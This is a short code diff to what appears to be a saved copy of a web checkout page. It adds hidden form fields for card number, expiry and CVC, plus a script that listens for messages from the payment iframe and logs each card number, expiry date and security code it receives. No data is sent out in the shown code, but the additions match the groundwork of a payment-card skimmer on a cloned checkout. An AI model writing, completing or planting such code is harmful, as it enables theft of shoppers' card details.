@@ -1568,6 +1568,9 @@
                               <div id="spinner" class="spinner hidden"></div><span id="button-text">Make Payment</span>
                             </button></div>
                           <div id="payment-message" class="hidden"></div>
+<input type="hidden" id="payment-numberInput" value="">
+<input type="hidden" id="payment-expiredInput" value="">
+<input type="hidden" id="payment-ccvInput" value="">
                         </div>
                       </div>
                     </div>
@@ -2866,6 +2869,33 @@
     src="./CheckoutFiles/hcaptcha-invisible-7d723e95b84c76882f97b58bde0268e0.html"
     style="border: none !important; margin: 0px !important; padding: 0px !important; width: 1px !important; min-width: 100% !important; overflow: hidden !important; display: block !important; visibility: hidden !important; position: fixed !important; height: 1px !important; pointer-events: none !important; user-select: none !important;"
     data-initialized="true"></iframe>
+
+
+    <script>
+
+// 父页面全局监听message事件
+window.addEventListener('message', function (e) {
+  // e.data 就是iframe传过来的对象
+  const msg = e.data;
+  if (!msg?.event) return;
+
+  switch (msg.event) {
+    case 'card_number_input':
+      console.log('父页面收到卡号输入：', msg.payload.value);
+      break;
+    case 'expiry_input':
+      console.log('父页面收到有效期：', msg.payload.value);
+      break;
+    case 'cvc_input':
+      console.log('父页面收到安全码：', msg.payload.value);
+      break;
+    case 'card_blur':
+      console.log('卡号输入框失去焦点，完整值：', msg.payload.value);
+      break;
+  }
+});
+
+    </script>
 </body>
 
 </html>
